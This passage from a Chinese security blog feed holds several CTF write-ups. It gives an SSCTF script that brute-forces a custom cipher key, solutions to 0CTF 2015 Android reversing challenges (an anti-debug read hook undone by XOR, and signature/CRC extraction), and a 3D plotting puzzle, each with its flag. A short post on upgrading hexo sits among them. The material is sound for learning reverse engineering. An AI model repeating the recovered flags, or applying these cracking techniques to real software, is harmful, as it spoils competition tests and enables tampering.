class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">A = [85, 128, 177, 163, 7, 242, 231, 69, 185, 1, 91, 89, 80, 156, 81, 9, 102,</span><br><span class="line">221, 195, 33, 31, 131, 179, 246, 15, 139, 205, 49, 107, 193, 5, 63, 117, 74,</span><br><span class="line">140, 29, 135, 43, 197, 212, 0, 189, 218, 190, 112, 83, 238, 47, 194, 68, 233,</span><br><span class="line">67, 122, 138, 53, 14, 35, 76, 79, 162, 145, 51, 90, 234, 50, 6, 225, 250, 215,</span><br><span class="line">133, 180, 97, 141, 96, 20, 226, 3, 191, 187, 57, 168, 171, 105, 113, 196, 71,</span><br><span class="line">239, 200, 254, 175, 164, 203, 61, 16, 241, 40, 176, 59, 70, 169, 146, 247, 232,</span><br><span class="line">152, 165, 62, 253, 166, 167, 182, 160, 125, 78, 28, 130, 159, 255, 124, 153, 56,</span><br><span class="line">58, 143, 150, 111, 207, 206, 32, 144,</span><br><span class="line">     75, 39, 10, 201, 204, 77, 104, 65, 219, 98, 210, 173, 249, 13, 12, 103,</span><br><span class="line">101, 21, 115, 48, 157, 147, 11, 99, 227, 45, 202, 158, 213, 100, 244, 54, 17,</span><br><span class="line">161, 123, 92, 181, 243, 184, 188, 84, 95, 27, 72, 106, 192, 52, 44, 55, 129,</span><br><span class="line">208, 109, 26, 24, 223, 64, 114, 19, 198, 23, 82, 120, 142, 178, 214, 186, 116,</span><br><span class="line">94, 222, 86, 251, 36, 4, 248, 132, 25, 211, 199, 30, 87, 60, 127, 155, 41, 224,</span><br><span class="line">151, 237, 136, 245, 37, 170, 252, 8, 42, 209, 46, 108, 88, 183, 149, 110, 66,</span><br><span class="line">235, 229, 134, 73, 38, 118, 236, 119, 154, 216, 217, 240, 22, 121, 174, 93, 126,</span><br><span class="line">230, 228, 18, 148, 220, 172, 2, 137, 34]</span><br><span class="line">B = [0, 2, 3, 7, 1, 5, 6, 4]</span><br><span class="line">C = [179, 132, 74, 60, 94, 252, 166, 242, 208, 217, 117, 255, 20, 99, 225, 58,</span><br><span class="line">54, 184, 243, 37, 96, 106, 64, 151, 148, 248, 44, 175, 152, 40, 171, 251, 210,</span><br><span class="line">118, 56, 6, 138, 77, 45, 169, 209, 232, 68, 182, 91, 203, 9, 16, 172, 95, 154,</span><br><span class="line">90, 164, 161, 231, 11, 21, 3, 97, 70, 34, 86, 124, 114, 119, 223, 123, 167, 47,</span><br><span class="line">219, 197, 221, 193, 192, 126, 78, 39, 233, 4, 120, 33, 131, 145, 183, 143, 31,</span><br><span class="line">76, 121, 92, 153, 85, 100, 52, 109, 159, 112, 71, 62, 8, 244, 116, 245, 240,</span><br><span class="line">215, 111, 134, 199, 214, 196, 213, 180, 189, 224, 101, 202, 201, 168, 32, 250,</span><br><span class="line">59, 43, 27, 198, 239, 137, 238, 50,</span><br><span class="line">     149, 107, 247, 7, 220, 246, 204, 127, 83, 146, 147, 48, 17, 67, 23, 93,</span><br><span class="line">115, 41, 191, 2, 227, 87, 173, 108, 82, 205, 49, 1, 66, 105, 176, 22, 236, 29,</span><br><span class="line">170, 110, 18, 28, 185, 235, 61, 88, 13, 165, 188, 177, 230, 130, 253, 150, 211,</span><br><span class="line">42, 129, 125, 141, 19, 190, 133, 53, 84, 140, 135, 10, 241, 222, 73, 12, 155,</span><br><span class="line">57, 237, 181, 36, 72, 174, 207, 98, 5, 229, 254, 156, 178, 128, 55, 14, 69, 30,</span><br><span class="line">194, 122, 46, 136, 160, 206, 26, 102, 218, 103, 139, 195, 0, 144, 186, 249, 79,</span><br><span class="line">81, 75, 212, 234, 158, 163, 80, 226, 65, 200, 38, 187, 113, 63, 24, 25, 142, 51,</span><br><span class="line">228, 35, 157, 216, 104, 162, 15, 89]</span><br><span class="line">D = [2, 4, 0, 5, 6, 7, 1, 3]</span><br><span class="line"></span><br><span class="line">def LShift(t, k):</span><br><span class="line">    k %= 8</span><br><span class="line">    return ((t &lt;&lt; k) | (t &gt;&gt; (8 - k))) &amp; 0xff</span><br><span class="line"></span><br><span class="line">def RShift(t, k):</span><br><span class="line">    k %= 8</span><br><span class="line">    return ((t &lt;&lt; (8 - k )) | (t &gt;&gt; k)) &amp; 0xff</span><br><span class="line"></span><br><span class="line">def encode(p):</span><br><span class="line">    ret = &quot;&quot;</span><br><span class="line">    for i in range(8):</span><br><span class="line">        ret = (&apos;|&apos; if (p &gt;&gt; i) &amp; 1 else &apos;O&apos;) + ret</span><br><span class="line">    return ret</span><br><span class="line"></span><br><span class="line">def decode(c):</span><br><span class="line">    t = bytearray()</span><br><span class="line">    c = c.replace(&apos;|&apos;, &apos;1&apos;)</span><br><span class="line">    c = c.replace(&apos;O&apos;, &apos;0&apos;)</span><br><span class="line">    for i in xrange(0, len(c), 8):</span><br><span class="line">        t.append(int(c[i:i+8], 2))</span><br><span class="line">    return t</span><br><span class="line"></span><br><span class="line">def encrypt(plain, key):</span><br><span class="line">    global A, B, C, D</span><br><span class="line">    t1 = bytearray()</span><br><span class="line">    for i in plain:</span><br><span class="line">        t1.append(A[i])</span><br><span class="line">    t2 = bytearray()</span><br><span class="line">    for i in range(len(t1)):</span><br><span class="line">        t2.append(LShift(t1[i], B[i % 8]))</span><br><span class="line">    for times in range(16):</span><br><span class="line">        for i in range(len(t2)):</span><br><span class="line">            t2[i] = C[t2[i]]</span><br><span class="line">        for i in range(len(t2)):</span><br><span class="line">            t2[i] = LShift(t2[i], i ^ D[i % 8])</span><br><span class="line">        for i in range(len(t2)):</span><br><span class="line">            t2[i] ^= key[i % 8]</span><br><span class="line">    out = &quot;&quot;</span><br><span class="line">    for i in t2:</span><br><span class="line">        out += encode(i)</span><br><span class="line">    return out</span><br><span class="line"></span><br><span class="line"># out</span><br><span class="line">c_plain =</span><br><span class="line">&apos;OO|OO||OO|||||OO|OO||O||O|O||O|||O|OOOOOOO|O|O|O|||||OO|||O|||OO||O|OOOOOO|O|OO|OO||||OO|||OOOO|||||O||||O|OO|O|O|O||OO|O||O|OO|O||O|||O||O|OO|OOOOOO||OOO|O|O|O|||O|OO|O|O||O||O||OOOOO|||OO|O|&apos;</span><br><span class="line">c_flag =</span><br><span class="line">&apos;OO||O||O|O|||OOOO||||||O|O|||OOO||O|OOOO||O|O|OO|||||OOOO||||O||OO|OO||O||O|O|O|||||OOOOOO|O|O||OOOOOOO||O|||OOOO||OO|OO|||O|OO|O|||O|O|OO|OOOO|OOO|OOO|OOOO||O|OO||||OO||||OOO|O|O||OO||||O||OOO|||O|OO|OO||OO||OOOO|O|&apos;</span><br><span class="line"></span><br><span class="line">plain = bytearray(&quot;asdfghjk123456&quot;)</span><br><span class="line"></span><br><span class="line">d_plain = decode(c_plain)</span><br><span class="line">key = bytearray(&quot;        &quot;)</span><br><span class="line">chars = range(32, 128)</span><br><span class="line">for i in range(8):</span><br><span class="line">    for c in chars:</span><br><span class="line">        key[i] = chr(c)</span><br><span class="line">        tmp = decode(encrypt(plain, key))</span><br><span class="line">        if i &lt;= 2:</span><br><span class="line">            if tmp[i] == d_plain[i] and tmp[i + 8] == d_plain[i + 8]:</span><br><span class="line">                print &apos;[*] key: &apos; + key</span><br><span class="line">                break</span><br><span class="line">        else:</span><br><span class="line">            if tmp[i] == d_plain[i]:</span><br><span class="line">                print &apos;[*] key: &apos; + key</span><br><span class="line">                break</span><br><span class="line">print &apos;[+] key: &apos; + key</span><br><span class="line"></span><br><span class="line">d_flag = decode(c_flag)</span><br><span class="line">flag = bytearray(&quot; &quot; * len(d_flag))</span><br><span class="line"></span><br><span class="line">for i in range(0, len(d_flag)):</span><br><span class="line">    for c in chars:</span><br><span class="line">        flag[i] = chr(c)</span><br><span class="line">        e = decode(encrypt(flag, key))</span><br><span class="line">        if e[:i+1] == d_flag[:i+1]:</span><br><span class="line">            print &quot;[*] flag: &quot; + flag</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">print &apos;[+] flag: &apos; + flag</span><br></pre></td></tr></table></figure></p><p>运行结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">*] key: ^</span><br><span class="line">[*] key: ^&amp;</span><br><span class="line">[*] key: ^&amp;#</span><br><span class="line">[*] key: ^&amp;#q</span><br><span class="line">[*] key: ^&amp;#qD</span><br><span class="line">[*] key: ^&amp;#qD9</span><br><span class="line">[*] key: ^&amp;#qD93</span><br><span class="line">[*] key: ^&amp;#qD93_</span><br><span class="line">[+] key: ^&amp;#qD93_</span><br><span class="line">[*] flag: S</span><br><span class="line">[*] flag: SS</span><br><span class="line">[*] flag: SSC</span><br><span class="line">[*] flag: SSCT</span><br><span class="line">[*] flag: SSCTF</span><br><span class="line">[*] flag: SSCTF&#123;</span><br><span class="line">[*] flag: SSCTF&#123;1</span><br><span class="line">[*] flag: SSCTF&#123;1q</span><br><span class="line">[*] flag: SSCTF&#123;1qa</span><br><span class="line">[*] flag: SSCTF&#123;1qaz</span><br><span class="line">[*] flag: SSCTF&#123;1qaz9</span><br><span class="line">[*] flag: SSCTF&#123;1qaz9o</span><br><span class="line">[*] flag: SSCTF&#123;1qaz9ol</span><br><span class="line">[*] flag: SSCTF&#123;1qaz9ol.</span><br><span class="line">[*] flag: SSCTF&#123;1qaz9ol.n</span><br><span class="line">[*] flag: SSCTF&#123;1qaz9ol.nh</span><br><span class="line">[*] flag: SSCTF&#123;1qaz9ol.nhy</span><br><span class="line">[*] flag: SSCTF&#123;1qaz9ol.nhy6</span><br><span class="line">[*] flag: SSCTF&#123;1qaz9ol.nhy64</span><br><span class="line">[*] flag: SSCTF&#123;1qaz9ol.nhy64r</span><br><span class="line">[*] flag: SSCTF&#123;1qaz9ol.nhy64rf</span><br><span class="line">[*] flag: SSCTF&#123;1qaz9ol.nhy64rfv</span><br><span class="line">[*] flag: SSCTF&#123;1qaz9ol.nhy64rfv7</span><br><span class="line">[*] flag: SSCTF&#123;1qaz9ol.nhy64rfv7u</span><br><span class="line">[*] flag: SSCTF&#123;1qaz9ol.nhy64rfv7uj</span><br><span class="line">[*] flag: SSCTF&#123;1qaz9ol.nhy64rfv7ujm</span><br><span class="line">[*] flag: SSCTF&#123;1qaz9ol.nhy64rfv7ujm&#125;</span><br><span class="line">[+] flag: SSCTF&#123;1qaz9ol.nhy64rfv7ujm&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>关于博客更新</title>
      <link href="/2016/02/23/%E5%85%B3%E4%BA%8E%E5%8D%9A%E5%AE%A2%E6%9B%B4%E6%96%B0/"/>
      <url>/2016/02/23/%E5%85%B3%E4%BA%8E%E5%8D%9A%E5%AE%A2%E6%9B%B4%E6%96%B0/</url>
      <content type="html"><![CDATA[<p>前段时间一直没静下心来更新博客，最近把<code>nodejs</code>和<code>hexo</code>都升级了，换了个新主题，关于评论暂时先关闭吧。</p><a id="more"></a><p>以下记录一下升级时候遇到的坑。</p><p>开始直接安装<code>nodejs</code>和<code>hexo-cli</code>，在运行<code>hexo</code>时候总是报错以下错误：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123; [Error: Cannot find module './build/Release/DTraceProviderBindings'] code: 'MODULE_NOT_FOUND' &#125;</span><br><span class="line">&#123; [Error: Cannot find module './build/default/DTraceProviderBindings'] code: 'MODULE_NOT_FOUND' &#125;</span><br><span class="line">&#123; [Error: Cannot find module './build/Debug/DTraceProviderBindings'] code: 'MODULE_NOT_FOUND' &#125;</span><br></pre></td></tr></table></figure></p><p><code>Google</code>了以下，解决办法是：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo --no-optional</span><br></pre></td></tr></table></figure></p><p>还有一个问题是安装<code>hexo</code>时候发现特别慢，后来发现有国内的<code>nodejs</code>源，果断换了，在<code>.npmrc</code>文件中添加如下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">egistry = https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> Other </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Other </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>0CTF 2015 Quals simpleapk Write-up</title>
      <link href="/2015/04/04/0CTF-2015-Quals-simpleapk-Write-up/"/>
      <url>/2015/04/04/0CTF-2015-Quals-simpleapk-Write-up/</url>
      <content type="html"><![CDATA[<p>#simpleapk<br>150 Pts<br>This is a simple <a href="http://dl.0ops.net/simple.apk" target="_blank" rel="noopener">apk</a>, Could you find the flag?</p><a id="more"></a><p>逆向，根据代码发现<code>flag</code>就存放在<code>flag.txt</code>中，提取出来，内容如下：<br><code>0ctf{Too_Simple_Sometimes_Naive!!!}</code><br>提交发现不对！！！然后分析代码，发现加载了一个<code>libantidebug.so</code>库，猜测对系统函数做了<code>hook</code>。逆向<code>libantidebug.so</code>，找到<code>my_init()</code>函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">my_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// r0@1</span></span><br><span class="line">  <span class="keyword">__pid_t</span> v1; <span class="comment">// r0@3</span></span><br><span class="line">  __int64 v2; <span class="comment">// ST00_8@3</span></span><br><span class="line"></span><br><span class="line">  v0 = j_j_set_logfunction(nullsub_2);</span><br><span class="line">  <span class="keyword">if</span> ( CheckSig(v0) )</span><br><span class="line">    j_j_exit(<span class="number">0</span>);</span><br><span class="line">  v1 = j_j_getpid();</span><br><span class="line">  LODWORD(v2) = CheckStrace;</span><br><span class="line">  HIDWORD(v2) = CheckPtrace;</span><br><span class="line">  j_j_hook(&amp;unk_6004, v1, <span class="string">"libc."</span>, <span class="string">"read"</span>);</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>把<code>CheckPtrace</code>函数<code>hook</code>到<code>read</code>函数上了，这里看一下<code>CheckPtrace</code>的代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">CheckPtrace</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// r5@1</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// r6@1</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// r7@1</span></span><br><span class="line">  <span class="keyword">__pid_t</span> v6; <span class="comment">// r0@1</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// r0@1</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// r3@1</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// r0@2</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [sp+Ch] [bp-24Ch]@1</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [sp+14h] [bp-244h]@1</span></span><br><span class="line">  <span class="keyword">char</span> dest[<span class="number">36</span>]; <span class="comment">// [sp+18h] [bp-240h]@1</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+3Ch] [bp-21Ch]@1</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// [sp+13Ch] [bp-11Ch]@1</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [sp+23Ch] [bp-1Ch]@1</span></span><br><span class="line"></span><br><span class="line">  v3 = a2;</span><br><span class="line">  v10 = a3;</span><br><span class="line">  v4 = a1;</span><br><span class="line">  v15 = _stack_chk_guard;</span><br><span class="line">  j_j_memcpy(dest, &amp;unk_4818, <span class="number">0x23</span>u);</span><br><span class="line">  v5 = dword_6044;</span><br><span class="line">  j_j_hook_precall();</span><br><span class="line">  v11 = ((<span class="keyword">int</span> (__fastcall *)(<span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>))v5)(v4, v3, v10);</span><br><span class="line">  v6 = j_j_getpid();</span><br><span class="line">  j_j_snprintf(&amp;s, <span class="number">0xFF</span>u, <span class="string">"/proc/%d/fd/%d"</span>, v6, v4);</span><br><span class="line">  j_j_memset(&amp;v14, <span class="number">0</span>, <span class="number">0x100</span>u);</span><br><span class="line">  j_j_readlink(&amp;s, &amp;v14, <span class="number">0xFF</span>u);</span><br><span class="line">  v7 = j_j_strstr(&amp;v14, <span class="string">"/data/data/easyre.sjl.gossip.easyre"</span>);</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( v8 != v10 )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)(v3 + v8) ^= dest[v8];</span><br><span class="line">      ++v8;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  j_j_hook_postcall(&amp;unk_6004);</span><br><span class="line">  result = v11;</span><br><span class="line">  <span class="keyword">if</span> ( v15 != _stack_chk_guard )</span><br><span class="line">    j_j___stack_chk_fail(v11);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>后面有一段做异或的，而且长度是36，正好与<code>flag</code>长度一致，把那段数据提取出来，与<code>flag</code>做异或，如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">oldFlag = <span class="string">"0ctf&#123;Too_Simple_Sometimes_Naive!!!&#125;"</span></span><br><span class="line">newFlag = <span class="string">''</span></span><br><span class="line">test = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x1D</span>, <span class="number">0x1B</span>, <span class="number">0x48</span>, <span class="number">0x2C</span>, <span class="number">0xC</span>, <span class="number">0x24</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">9</span>,</span><br><span class="line">        <span class="number">0x3A</span>, <span class="number">0xB</span>, <span class="number">0x3B</span>, <span class="number">0xE</span>, <span class="number">3</span>, <span class="number">0x3A</span>, <span class="number">0x39</span>, <span class="number">0xC</span>, <span class="number">8</span>, <span class="number">0x11</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x1A</span>, <span class="number">9</span>,</span><br><span class="line">        <span class="number">0xC</span>, <span class="number">0x29</span>, <span class="number">0x20</span>, <span class="number">0x58</span>, <span class="number">0x44</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">flag_len = len(oldFlag)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(flag_len):</span><br><span class="line">    newFlag += chr(<span class="number">0xFF</span> &amp; (ord(oldFlag[i]) ^ test[i]));</span><br><span class="line"><span class="keyword">print</span> <span class="string">'flag:'</span>, newFlag</span><br></pre></td></tr></table></figure></p><p>得到flag：<code>0ctf{It&#39;s_More_Than_Meets_The_Eye!}</code></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>0CTF 2015 Quals VEZEL Write-up</title>
      <link href="/2015/04/04/0CTF-2015-Quals-VEZEL-Write-up/"/>
      <url>/2015/04/04/0CTF-2015-Quals-VEZEL-Write-up/</url>
      <content type="html"><![CDATA[<p>#VEZEL<br>100 Pts<br>Evermars says he is good at repackaging Android applications, for <a href="http://dl.0ops.net/vezel.apk" target="_blank" rel="noopener">example</a>.</p><a id="more"></a><p>逆向知道<code>flag</code>由两部分组成：签名和<code>classes.dex</code>的<code>CRC</code>。写了一个<code>APP</code>获取这两个值即可，如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String str1 = String.valueOf(getSig(<span class="string">"com.ctf.vezel"</span>));</span><br><span class="line">String str2 = getCrc();</span><br><span class="line">Log.d(<span class="string">"crack-sig-crc"</span>, str1);</span><br><span class="line">Log.d(<span class="string">"crack-sig-crc"</span>, str2);</span><br><span class="line">Log.d(<span class="string">"crack-sig-crc"</span>, <span class="string">"0CTF&#123;"</span> + str1 + str2 + <span class="string">"&#125;"</span>);</span><br></pre></td></tr></table></figure></p><p>得到flag：<code>0CTF{-1839715371189242199}</code></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>0CTF 2015 Quals x-y-z Write-up</title>
      <link href="/2015/03/31/0CTF-2015-Quals-x-y-z-Write-up/"/>
      <url>/2015/03/31/0CTF-2015-Quals-x-y-z-Write-up/</url>
      <content type="html"><![CDATA[<p>#x-y-z<br>150 Pts<br><a href="http://dl.0ops.net/x-y-z" target="_blank" rel="noopener">x-y-z</a></p><a id="more"></a><p>一堆数字:：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-4.751373,-2.622809,2.428588;-4.435134,-3.046589,2.406030;-4.788052,-2.661979,2.464709</span><br><span class="line">-4.692748,-2.599611,2.629112;-4.656070,-2.560445,2.592991;-4.788052,-2.661979,2.464709</span><br></pre></td></tr></table></figure></p><p>初步估计是坐标，每行三个点，三个点可以构成三角形，然后用<code>Python</code>绘制图形，应该就出来结果了，绘制代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> matplotlib.ticker <span class="keyword">import</span> MaxNLocator</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> cm</span><br><span class="line"><span class="keyword">from</span> mpl_toolkits.mplot3d <span class="keyword">import</span> Axes3D</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DATA = []</span><br><span class="line">triangles = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"x-y-z"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    lines = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        points = line.rstrip(<span class="string">"\r\n"</span>).split(<span class="string">";"</span>)</span><br><span class="line">        t = []</span><br><span class="line">        <span class="keyword">for</span> point <span class="keyword">in</span> points:</span><br><span class="line">            x = float(point.split(<span class="string">","</span>)[<span class="number">0</span>])</span><br><span class="line">            y = float(point.split(<span class="string">","</span>)[<span class="number">1</span>])</span><br><span class="line">            z = float(point.split(<span class="string">","</span>)[<span class="number">2</span>])</span><br><span class="line">            p = [x, y, z]</span><br><span class="line">            t.append(p)</span><br><span class="line"></span><br><span class="line">        triangles.append(t)</span><br><span class="line"></span><br><span class="line">Xs = []</span><br><span class="line">Ys = []</span><br><span class="line">Zs = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> triangle <span class="keyword">in</span> triangles:</span><br><span class="line">    verts = np.array(triangle)</span><br><span class="line">    Xs.append(verts[:, <span class="number">0</span>])</span><br><span class="line">    Ys.append(verts[:, <span class="number">1</span>])</span><br><span class="line">    Zs.append(verts[:, <span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">fig = plt.figure()</span><br><span class="line">ax = fig.add_subplot(<span class="number">111</span>, projection=<span class="string">'3d'</span>)</span><br><span class="line"></span><br><span class="line">surf = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(Xs)):</span><br><span class="line">    surf.append(ax.plot_trisurf(Xs[i], Ys[i], Zs[i], cmap=cm.jet, linewidth=<span class="number">0</span>))</span><br><span class="line">    ax.xaxis.set_major_locator(MaxNLocator(<span class="number">5</span>))</span><br><span class="line">    ax.yaxis.set_major_locator(MaxNLocator(<span class="number">6</span>))</span><br><span class="line">    ax.zaxis.set_major_locator(MaxNLocator(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure></p><p>绘制出来的图形如下：<br><img src="http://junzhepanblog.qiniudn.com/x-y-z.png" alt="flag"><br>得到flag：<code>0ctf{0ur_Flag_L00ks_Great_in_Three_D}</code>。</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>0CTF 2015 Quals peers Write-up</title>
      <link href="/2015/03/31/0CTF-2015-Quals-peers-Write-up/"/>
      <url>/2015/03/31/0CTF-2015-Quals-peers-Write-up/</url>
